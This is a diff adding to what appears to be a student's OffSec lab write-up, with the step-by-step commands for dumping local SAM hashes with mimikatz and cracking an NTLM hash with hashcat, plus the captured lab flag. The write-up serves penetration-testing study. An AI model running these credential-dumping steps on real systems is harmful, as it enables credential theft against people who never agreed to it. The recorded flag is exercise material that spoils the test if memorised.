@@ -139,9 +139,36 @@ RDP Connection as nelly
 
 Lab 1 - Follow the steps outlined in this section and find the flag on the nelly user's desktop on VM #1 (MARKETINGWK01).
 >``` shell
+>xfreerdp /u:offsec /p:lab /v:192.168.213.210 /cert:ignore
 >
+># Run Powershell as administartor
+>
+>Get-LocalUser
+>
+>cd C:\tools
+>
+>ls
+>
+>.\mimikatz.exe
+>
+>privilege::debug
+>
+>token::elevate
+>
+>lsadump::sam
+>
+>cat > nelly.hash << EOF
+>3ae8e5f0ffabb3a627672e1600f1ba10
+>EOF
+>
+>hashcat --help | grep -i ntlm
+>
+>hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt \
+>-r /usr/share/hashcat/rules/best64.rule
+>
+>hashcat -m 1000 nelly.hash --show
 >```
->
+>OS{251d3e79de2a2f9ad4cb9551f18b6f81}
 
 Lab 2 - Access VM #2 via RDP as user nadine with the password retrieved in the exercise of the section labeled "Password Manager" and leverage the methods from this section to extract Steve's NTLM hash. Use best66.rule for the cracking process and enter the plain text password as answer to this exercise.
 >``` shell
